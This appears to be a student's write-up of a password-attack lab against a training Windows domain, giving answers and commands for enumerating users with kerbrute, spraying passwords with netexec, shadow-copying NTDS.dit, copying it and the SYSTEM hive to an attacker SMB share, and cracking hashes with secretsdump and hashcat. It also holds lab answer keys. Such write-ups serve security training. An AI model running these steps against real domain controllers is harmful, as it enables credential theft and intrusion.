##  What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)

```
NTDS.dit
```


##  Submit the NT hash associated with the Administrator user from the example output in the section reading.

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

64f12cddaa88057e06a81b54e73b949b

```


##  On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

```
nano names.txt

John Marston IT Director
Carol Johnson Financial Controller  
Jennifer Stapleton Logistics Manager
```

```
git clone https://github.com/urbanadventurer/username-anarchy 
sudo ./username-anarchy/username-anarchy  -i ./names.txt >> names_expanded.txt     
```

```
# sudo wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
# sudo chmod +x kerbrute_linux_amd64 
```
[https://github.com/ropnop/kerbrute/issues/50](https://github.com/ropnop/kerbrute/issues/50)

```
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
gedit Makefile
ARCHS=amd64 386 arm64
make linux
```

```
nmap 10.129.202.85 -A
```
![Снимок экрана 2026-01-29 в 20.27.50](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-29%20%D0%B2%2020.27.50.png)


```
# ./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain ILF.local names_expanded.txt

./kerbrute/dist/kerbrute_linux_arm64 userenum --dc 10.129.202.85 --domain ILF.local names_expanded.txt
```
![Снимок экрана 2026-01-29 в 20.42.46](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-29%20%D0%B2%2020.42.46.png)

```
netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
```
![Снимок экрана 2026-01-29 в 20.45.06](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-29%20%D0%B2%2020.45.06.png)

##  Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

```
#netexec smb 10.129.10.193 -u jmarston - p P@ssword! -M ntdsutil

evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
net localgroup
net user jmarston
vssadmin CREATE SHADOW /For=C:

mkdir C:\NTDS
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents/

cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.14.14\CompData
reg.exe save hklm\system C:\system.save
cmd.exe /c move C:\system.save \\10.10.14.14\CompData
sudo impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
hashcat -a 0 -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
```
